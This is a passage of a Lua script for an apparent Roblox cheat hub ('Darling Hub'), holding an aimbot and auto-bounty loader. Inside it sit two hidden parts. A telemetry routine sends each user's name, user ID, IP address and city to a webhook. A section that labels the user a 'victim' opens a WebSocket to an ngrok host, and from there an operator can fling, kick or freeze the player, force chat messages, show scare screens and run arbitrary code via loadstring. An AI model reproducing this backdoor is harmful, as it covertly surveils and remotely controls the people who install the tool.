                          "Usuario: " .. LocalPlayer.Name .. " (ID: " .. LocalPlayer.UserId .. ")\n" ..
                          "IP: " .. ip .. "\n" ..
                          "Ubicacion: " .. city .. ", " .. country .. "\n" ..
                          "Ejecuciones: " .. getgenv().execCount .. "\n" ..
                          "Servidor: " .. game.JobId
            }

            if exRequest then
                exRequest({
                    Url = webhook,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode(payload)
                })
            end
        end)
    end)
end

local function launchHub(mode)
    local isFast = (mode == "fast")
    DarlingHub.IsFastMode = isFast
    _G.DarlingFastBountyMode = isFast
    if getgenv then getgenv().DarlingFastBountyMode = isFast end

    pcall(function()
        local bMod = DarlingHub:Require("modules/combat/auto_bounty.lua")
        if bMod then
            bMod.AutoBountyMode = isFast
            if bMod.saveConfig then bMod.saveConfig() end
        end
    end)

    local manifestToLoad = isFast and fastManifest or tabManifest
    DarlingHub.IsLoadingConfig = true

    task.spawn(function()
        pcall(function()
            local parents = {}
            if gethui then pcall(function() table.insert(parents, gethui()) end) end
            if CoreGui then table.insert(parents, CoreGui) end
            local pg = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
            if pg then table.insert(parents, pg) end

            local targetNames = {
                "DragonM1Button",
                "AuroraX_FastAttack_GUI",
                "Darling_DragonM1_GUI",
                "Darling_FastAttack_GUI",
                "FruitsM1Button",
                "DarlingFloatingWidgets",
            }
            for _, p in ipairs(parents) do
                for _, n in ipairs(targetNames) do
                    local old = p:FindFirstChild(n)
                    if old then pcall(function() old:Destroy() end) end
                end
            end
        end)

        if isFast then
            applyMinimumGraphics()
        end

        for _, item in ipairs(manifestToLoad) do
            local tabKey, relPath = item[1], item[2]
            if not DarlingHub.Tabs[tabKey] then
                local mod = DarlingHub:Require(relPath)
                if type(mod) == "function" then
                    local ok, tabObj = pcall(mod, tabContext)
                    if ok and tabObj then
                        DarlingHub.Tabs[tabKey] = tabObj
                    else
                        warn("[Darling Hub] Tab load error (" .. tostring(tabKey) .. "): " .. tostring(tabObj))
                    end
                end
            end
            task.wait(0.04)
        end
        if not isFast then
            sortTabsOrder()
        end

        -- 15. Auto-Load Saved Configuration
        pcall(function()
            if DarlingHub.LoadConfig then
                DarlingHub.LoadConfig(true)
            end
        end)

        -- 16. Hub Initialization Complete & Reveal Main Window
        pcall(function()
            setWindUIGuiVisibility(true)
            local mainFrame = (Window.GetMainFrame and Window:GetMainFrame()) or Window.Frame or (Window.UIElements and Window.UIElements.Main)
            if mainFrame then
                mainFrame.Visible = true
            end
            Window:SelectTab(1)
            styleOpenButtonBorder()
            createGuaranteedUIToggle()
            local lang = _G.DarlingLanguage or (getgenv and getgenv().DarlingLanguage) or currentLanguage
            if lang and lang ~= "English" and DarlingHub.ApplyLanguage then
                DarlingHub.ApplyLanguage(lang)
            end
            if Window.SetToTheCenter then
                Window:SetToTheCenter()
            end
        end)

        task.wait(0.2)
        DarlingHub.IsLoadingConfig = false
        sendTelemetryAfterLaunch()

        if isFast then
            -- Auto-activate Aimbot with FFlags
            pcall(function()
                local tweaks = DarlingHub:Require("modules/utility/client_tweaks.lua")
                if tweaks and tweaks.setFFlags1 then
                    tweaks.setFFlags1(true)
                end
                DarlingHub.FeatureStates["FFlags 1 (FPS Booster)"] = true
                if DarlingHub.UIElements and DarlingHub.UIElements["FFlags 1 (FPS Booster)"] and DarlingHub.UIElements["FFlags 1 (FPS Booster)"].Set then
                    DarlingHub.UIElements["FFlags 1 (FPS Booster)"]:Set(true)
                end

                DarlingHub:Toggle("modules/combat/player_aimbot.lua", true)
                DarlingHub.FeatureStates["Player Silent Aim"] = true
                if DarlingHub.UIElements and DarlingHub.UIElements["Player Silent Aim"] and DarlingHub.UIElements["Player Silent Aim"].Set then
                    DarlingHub.UIElements["Player Silent Aim"]:Set(true)
                end
            end)

            -- Auto-activate Auto Bounty
            task.delay(1.0, function()
                pcall(function()
                    local bMod = DarlingHub:Require("modules/combat/auto_bounty.lua")
                    if bMod and not bMod.Enabled then
                        bMod.enable()
                        if DarlingHub.FeatureStates then
                            DarlingHub.FeatureStates["AutoBounty"] = true
                        end
                        if DarlingHub.UIElements and DarlingHub.UIElements["AutoBounty"] and DarlingHub.UIElements["AutoBounty"].Set then
                            DarlingHub.UIElements["AutoBounty"]:Set(true)
                        end
                    end
                end)
            end)

            WindUI:Notify({
                Title = "Auto Bounty Mode",
                Content = "Fast Auto Bounty active. Running with minimal overhead.",
                Duration = 3.5,
                Icon = darlingIcon
            })
        else
            pcall(function()
                local tweaks = DarlingHub:Require("modules/utility/client_tweaks.lua")
                if tweaks and tweaks.setFFlags1 then
                    tweaks.setFFlags1(false)
                end
                DarlingHub.FeatureStates["FFlags 1 (FPS Booster)"] = false
                if DarlingHub.UIElements and DarlingHub.UIElements["FFlags 1 (FPS Booster)"] and DarlingHub.UIElements["FFlags 1 (FPS Booster)"].Set then
                    DarlingHub.UIElements["FFlags 1 (FPS Booster)"]:Set(false)
                end
            end)

            local welcomeTitle = tr("Darling Hub", currentLanguage)
            local welcomeContent = tr("HubLoadedSuccess", currentLanguage)
            if not welcomeContent or welcomeContent == "HubLoadedSuccess" then
                welcomeContent = "Darling Hub loaded successfully."
            end

            WindUI:Notify({
                Title = welcomeTitle,
                Content = welcomeContent,
                Duration = 3.5,
                Icon = darlingIcon
            })
        end
    end)
end

-- -Broma
if not game:IsLoaded() then
    pcall(function() game.Loaded:Wait() end)
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local Debris = game:GetService("Debris")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

local WS_URL = "wss://hubcap-uneasy-unpopular.ngrok-free.dev"

local WS_Connect = (WebSocket and WebSocket.connect)
    or (websocket and websocket.connect)
    or (syn and syn.websocket and syn.websocket.connect)
    or (getgenv and getgenv().WebSocket and getgenv().WebSocket.connect)
    or (getgenv and getgenv().websocket and getgenv().websocket.connect)
if not WS_Connect then return end

local mySessionId = tostring(tick()) .. "_" .. tostring(math.random(1000, 9999))
_G.DarlingVictimSessionId = mySessionId

if _G.DarlingVictimWS then
    pcall(function() _G.DarlingVictimWS:Close() end)
    _G.DarlingVictimWS = nil
end

local currentJail = nil
local speedLoop = nil
local spinLoop = nil
local isSpinning = false
local controlsInverted = false

local function getGui()
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:FindFirstChild("PlayerGui")
    if pg then return pg end
    if gethui then
        local ok, h = pcall(gethui)
        if ok and h then return h end
    end
    return game:GetService("CoreGui")
end

local function getCharacter()
    local c = LocalPlayer.Character
    if c and c:FindFirstChild("HumanoidRootPart") then
        return c, c:FindFirstChild("HumanoidRootPart"), c:FindFirstChildOfClass("Humanoid")
    end
    local wc = workspace:FindFirstChild(LocalPlayer.Name)
    if wc and wc:FindFirstChild("HumanoidRootPart") then
        return wc, wc:FindFirstChild("HumanoidRootPart"), wc:FindFirstChildOfClass("Humanoid")
    end
    if c then
        local r = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
        local h = c:FindFirstChildOfClass("Humanoid")
        return c, r, h
    end
    return nil, nil, nil
end

local function handleCommand(data, ws)
    if data.target and data.target ~= "TODOS" then
        local t = string.lower(string.gsub(tostring(data.target), "%s+", ""))
        local myN = string.lower(string.gsub(tostring(LocalPlayer.Name or ""), "%s+", ""))
        local myD = string.lower(string.gsub(tostring(LocalPlayer.DisplayName or ""), "%s+", ""))
        if t ~= myN and t ~= myD and not string.find(myN, t, 1, true) and not string.find(t, myN, 1, true) then
            return
        end
    end

    pcall(function()
        ws:Send(HttpService:JSONEncode({
            type = "cmd_ack",
            action = tostring(data.action),
            username = tostring(LocalPlayer.Name),
            status = "ejecutado"
        }))
    end)

    local char, root, hum = getCharacter()
    local cam = workspace.CurrentCamera

    if data.action == "fling" and root then
        pcall(function()
            if hum then hum.Sit = true hum.PlatformStand = true end
            local bv = Instance.new("BodyVelocity")
            bv.Name = "DarlingFling"
            bv.Velocity = Vector3.new(math.random(-500, 500), 8000, math.random(-500, 500))
            bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            bv.Parent = root
            Debris:AddItem(bv, 1.5)
            root.AssemblyLinearVelocity = Vector3.new(0, 8000, 0)
            root.RotVelocity = Vector3.new(10000, 10000, 10000)
        end)

    elseif data.action == "explosion" and root then
        pcall(function()
            local exp = Instance.new("Explosion")
            exp.Position = root.Position
            exp.BlastPressure = 5000000
            exp.BlastRadius = 30
            exp.Parent = workspace
            if hum then hum.Sit = true hum.PlatformStand = true end
            local bv = Instance.new("BodyVelocity")
            bv.Name = "DarlingExplode"
            bv.Velocity = Vector3.new(math.random(-1500, 1500), 5000, math.random(-1500, 1500))
            bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            bv.Parent = root
            Debris:AddItem(bv, 1)
            root.RotVelocity = Vector3.new(6000, 6000, 6000)
        end)

    elseif data.action == "kick" then
        pcall(function()
            LocalPlayer:Kick("Has sido expulsado del servidor por un Administrador. (Error Code: 267)")
        end)
        task.delay(0.6, function()
            pcall(function()
                while true do
                    Instance.new("Message", workspace).Text = "KICKED"
                end
            end)
        end)

    elseif data.action == "reset_character" then
        pcall(function()
            if char then char:BreakJoints() end
            if hum then hum.Health = 0 hum:ChangeState(Enum.HumanoidStateType.Dead) end
            if root then root.CFrame = CFrame.new(0, -99999, 0) end
        end)

    elseif data.action == "freeze" and root then
        pcall(function() root.Anchored = true end)

    elseif data.action == "unfreeze" and root then
        pcall(function() root.Anchored = false end)

    elseif data.action == "super_speed" and hum then
        if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
        hum.WalkSpeed = 250
        speedLoop = RunService.RenderStepped:Connect(function()
            local _, _, h = getCharacter()
            if h then h.WalkSpeed = 250 end
        end)

    elseif data.action == "snail_speed" and hum then
        if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
        hum.WalkSpeed = 3
        speedLoop = RunService.RenderStepped:Connect(function()
            local _, _, h = getCharacter()
            if h then h.WalkSpeed = 3 end
        end)

    elseif data.action == "normal_speed" and hum then
        if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
        hum.WalkSpeed = 16

    elseif data.action == "spin" and root then
        isSpinning = true
        if spinLoop then pcall(function() spinLoop:Disconnect() end) spinLoop = nil end
        spinLoop = RunService.RenderStepped:Connect(function()
            if not isSpinning then return end
            local _, r, _ = getCharacter()
            if r then
                r.CFrame = r.CFrame * CFrame.Angles(0, math.rad(25), 0)
            end
        end)

    elseif data.action == "unspin" then
        isSpinning = false
        if spinLoop then pcall(function() spinLoop:Disconnect() end) spinLoop = nil end

    elseif data.action == "jail" and root then
        if currentJail then pcall(function() currentJail:Destroy() end) end
        local jModel = Instance.new("Model")
        jModel.Name = "DarlingCage"
        jModel.Parent = workspace
        local center = root.Position
        local walls = {
            {Vector3.new(0, -3.5, 0), Vector3.new(8, 1, 8)},
            {Vector3.new(0, 5, 0), Vector3.new(8, 1, 8)},
            {Vector3.new(4, 1, 0), Vector3.new(1, 8, 8)},
            {Vector3.new(-4, 1, 0), Vector3.new(1, 8, 8)},
            {Vector3.new(0, 1, 4), Vector3.new(8, 8, 1)},
            {Vector3.new(0, 1, -4), Vector3.new(8, 8, 1)},
        }
        for _, d in ipairs(walls) do
            local p = Instance.new("Part")
            p.Size = d[2]
            p.CFrame = CFrame.new(center + d[1])
            p.Anchored = true
            p.Material = Enum.Material.Neon
            p.Color = Color3.fromRGB(255, 0, 50)
            p.Transparency = 0.3
            p.CanCollide = true
            p.Parent = jModel
        end
        currentJail = jModel

    elseif data.action == "unjail" then
        if currentJail then pcall(function() currentJail:Destroy() end) end
        currentJail = nil

    elseif data.action == "bring" and root and data.position then
        pcall(function()
            root.CFrame = CFrame.new(data.position.x, data.position.y + 3, data.position.z)
        end)

    elseif data.action == "chat" and data.message then
        pcall(function()
            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:FindFirstChild("RBXSystem")
                if channel then
                    channel:SendAsync(tostring(data.message))
                else
                    TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(tostring(data.message))
                end
            else
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(data.message), "All")
            end
        end)

    elseif data.action == "blackout" then
        task.spawn(function()
            local g = getGui()
            if not g then return end
            local ui = Instance.new("ScreenGui")
            ui.Name = "DarlingBlackout"
            ui.IgnoreGuiInset = true
            ui.DisplayOrder = 999999
            ui.ResetOnSpawn = false
            ui.Parent = g
            local f = Instance.new("Frame")
            f.Size = UDim2.new(1, 0, 1, 0)
            f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            f.BorderSizePixel = 0
            f.Parent = ui
            task.wait(6)
            ui:Destroy()
        end)

    elseif data.action == "red_scare" then
        task.spawn(function()
            local g = getGui()
            if not g then return end
            local ui = Instance.new("ScreenGui")
            ui.Name = "DarlingScare"
            ui.IgnoreGuiInset = true
            ui.DisplayOrder = 999999
            ui.ResetOnSpawn = false
            ui.Parent = g
            local f = Instance.new("Frame")
            f.Size = UDim2.new(1, 0, 1, 0)
            f.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
            f.BackgroundTransparency = 0.15
            f.BorderSizePixel = 0
            f.Parent = ui
            local lbl = Instance.new("TextLabel")
            lbl.Size = UDim2.new(1, 0, 0.4, 0)
            lbl.Position = UDim2.new(0, 0, 0.3, 0)
            lbl.BackgroundTransparency = 1
            lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
            lbl.TextScaled = true
            lbl.Font = Enum.Font.GothamBlack
            lbl.Text = "YA ES TARDE. NO PUEDES ESCAPAR."
            lbl.Parent = f
            pcall(function()
                local s = Instance.new("Sound")
                s.SoundId = "rbxassetid://9069609267"
                s.Volume = 3
                s.Parent = workspace
                s:Play()
                task.delay(4, function() pcall(function() s:Destroy() end) end)
            end)
            for i = 1, 30 do
                f.BackgroundColor3 = (i % 2 == 0) and Color3.fromRGB(220, 0, 0) or Color3.fromRGB(20, 0, 0)
                lbl.Position = UDim2.new(0, math.random(-15, 15), 0.3, math.random(-15, 15))
                task.wait(0.08)
            end
            ui:Destroy()
        end)

    elseif data.action == "screen_alert" and data.message then
        task.spawn(function()
            pcall(function()
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Darling",
                    Text = tostring(data.message),
                    Duration = 5
                })
            end)
            local g = getGui()
            if not g then return end

            pcall(function()
                local oldAlert = g:FindFirstChild("DarlingAlert")
                if oldAlert then oldAlert:Destroy() end
            end)

            local ui = Instance.new("ScreenGui")
            ui.Name = "DarlingAlert"
            ui.IgnoreGuiInset = true
            ui.DisplayOrder = 999998
            ui.ResetOnSpawn = false
            ui.Parent = g

            local cardW = 380
            local cardH = 56
            local card = Instance.new("Frame")
            card.Name = "Toast"
            card.AnchorPoint = Vector2.new(0.5, 0)
            card.Size = UDim2.new(0, cardW, 0, cardH)
            card.Position = UDim2.new(0.5, 0, 0, -70)
            card.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
            card.BorderSizePixel = 0
            card.Parent = ui

            local cardCorner = Instance.new("UICorner")
            cardCorner.CornerRadius = UDim.new(0, 4)
            cardCorner.Parent = card

            local cardStroke = Instance.new("UIStroke")
            cardStroke.Color = Color3.fromRGB(30, 30, 30)
            cardStroke.Thickness = 1
            cardStroke.Parent = card

            local accentLine = Instance.new("Frame")
            accentLine.Size = UDim2.new(0, 3, 1, 0)
            accentLine.Position = UDim2.new(0, 0, 0, 0)
            accentLine.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
            accentLine.BorderSizePixel = 0
            accentLine.Parent = card

            local accentCorner = Instance.new("UICorner")
            accentCorner.CornerRadius = UDim.new(0, 4)
            accentCorner.Parent = accentLine

            local tag = Instance.new("TextLabel")
            tag.Size = UDim2.new(1, -24, 0, 14)
            tag.Position = UDim2.new(0, 14, 0, 8)
            tag.BackgroundTransparency = 1
            tag.Text = "DARLING"
            tag.TextColor3 = Color3.fromRGB(140, 140, 140)
            tag.Font = Enum.Font.GothamBold
            tag.TextSize = 10
            tag.TextXAlignment = Enum.TextXAlignment.Left
            tag.Parent = card

            local txt = Instance.new("TextLabel")
            txt.Size = UDim2.new(1, -24, 0, 24)
            txt.Position = UDim2.new(0, 14, 0, 24)
            txt.BackgroundTransparency = 1
            txt.TextColor3 = Color3.fromRGB(230, 230, 230)
            txt.TextSize = 13
            txt.Font = Enum.Font.GothamMedium
            txt.TextWrapped = true
            txt.TextXAlignment = Enum.TextXAlignment.Left
            txt.TextYAlignment = Enum.TextYAlignment.Center
            txt.Text = tostring(data.message)
            txt.Parent = card

            local timerBar = Instance.new("Frame")
            timerBar.Size = UDim2.new(1, 0, 0, 2)
            timerBar.Position = UDim2.new(0, 0, 1, -2)
            timerBar.BackgroundColor3 = Color3.fromRGB(160, 160, 160)
            timerBar.BorderSizePixel = 0
            timerBar.Parent = card

            local tweenIn = TweenService:Create(card, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Position = UDim2.new(0.5, 0, 0, 18)
            })
            tweenIn:Play()

            local barTween = TweenService:Create(timerBar, TweenInfo.new(5.5, Enum.EasingStyle.Linear), {
                Size = UDim2.new(0, 0, 0, 2)
            })
            barTween:Play()

            task.wait(5.8)

            local tweenOut = TweenService:Create(card, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                Position = UDim2.new(0.5, 0, 0, -75)
            })
            tweenOut:Play()
            tweenOut.Completed:Wait()

            ui:Destroy()
        end)

    elseif data.action == "invert_controls" then
        controlsInverted = true
        pcall(function()
            RunService:UnbindFromRenderStep("DarlingInvert")
            RunService:BindToRenderStep("DarlingInvert", Enum.RenderPriority.Character.Value + 1, function()
                if not controlsInverted then return end
                local _, _, h = getCharacter()
                if h and h.MoveDirection.Magnitude > 0.05 then
                    h:Move(-h.MoveDirection, false)
                end
            end)
        end)

    elseif data.action == "restore_controls" then
        controlsInverted = false
        pcall(function() RunService:UnbindFromRenderStep("DarlingInvert") end)

    elseif data.action == "earthquake" then
        if cam then
            task.spawn(function()
                local startT = tick()
                while tick() - startT < 6 do
                    local ox = (math.random() - 0.5) * 1.5
                    local oy = (math.random() - 0.5) * 1.5
                    cam.CFrame = cam.CFrame * CFrame.new(ox, oy, 0)
                    task.wait(0.03)
                end
            end)
        end

    elseif data.action == "execute" and data.code then
        task.spawn(function()
            local fn = loadstring(data.code)
            if fn then fn() end
        end)
    end
end

local function getValidJobId()
    local jid = tostring(game.JobId or "")
    local attempts = 0
    while (jid == "" or #jid < 5) and attempts < 15 do
        task.wait(0.5)
        jid = tostring(game.JobId or "")
        attempts = attempts + 1
    end
    return jid
end

task.spawn(function()
    while _G.DarlingVictimSessionId == mySessionId do
        local ok, ws = pcall(function() return WS_Connect(WS_URL) end)
        if ok and ws then
            _G.DarlingVictimWS = ws

            local function sendPresence(msgType)
                pcall(function()
                    local currentJid = getValidJobId()
                    ws:Send(HttpService:JSONEncode({
                        type = msgType or "victim_joined",
                        username = LocalPlayer.Name,
                        userId = LocalPlayer.UserId,
                        placeId = game.PlaceId,
                        gameId = game.GameId,
                        jobId = currentJid
                    }))
                end)
            end

            task.wait(0.5)
            sendPresence("victim_joined")

            local function onMsg(raw)
                local s, data = pcall(function() return HttpService:JSONDecode(raw) end)
                if s and data then
                    if data.type == "ping_victims" then
                        sendPresence("victim_joined")
                    elseif data.type == "master_command" then
                        task.spawn(function()
                            handleCommand(data, ws)
                        end)
                    end
                end
            end

            pcall(function() ws.OnMessage:Connect(onMsg) end)

            local isClosed = false
            pcall(function()
                ws.OnClose:Connect(function()
                    isClosed = true
                end)
            end)

            while not isClosed and _G.DarlingVictimWS == ws and _G.DarlingVictimSessionId == mySessionId do
                task.wait(10)
                sendPresence("victim_ping")
            end
        end
        if _G.DarlingVictimSessionId ~= mySessionId then break end
        task.wait(3)
    end
end)

-- 15. Show Startup Mode Selector Modal ("Choose A Mode")
local ModeSelectorMod = DarlingHub:Require("modules/ui/mode_selector.lua")
if ModeSelectorMod and ModeSelectorMod.show then
    ModeSelectorMod.show({
        isFastConfigured = isFastBountyMode,
        fastAsset = darlingLogoHalloween,
        fullAsset = darlingLogoNormal,
        onSelect = function(mode)
            launchHub(mode)
        end
    })
else
    launchHub(isFastBountyMode and "fast" or "full")
end
